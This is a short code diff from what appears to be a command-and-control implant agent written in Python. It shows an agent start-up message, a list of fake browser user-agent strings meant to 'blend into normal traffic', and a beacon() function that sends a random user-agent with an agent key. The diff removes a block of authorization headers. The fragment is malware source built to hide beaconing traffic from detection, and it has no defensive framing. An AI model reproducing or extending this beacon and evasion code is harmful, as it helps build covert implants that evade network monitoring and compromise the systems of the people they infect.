@@ -43,7 +43,6 @@ AGENT_META = {
 }
 
 print(f"[+] Agent started with ID: {AGENT_ID}")
-    
 
 # Fake user-agents to blend into normal traffic
 USER_AGENTS = [
@@ -56,12 +55,6 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.0.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
 ]
-
-headers = {
-    "User-Agent": random.choice(USER_AGENTS),
-    "Authorization": f"Bearer {AGENT_ID}",
-    "X-Session-ID": str(uuid.uuid4())
-}
 
 def beacon():
     headers = {"User-Agent": random.choice(USER_AGENTS), "X-Agent-Key": AGENT_KEY}
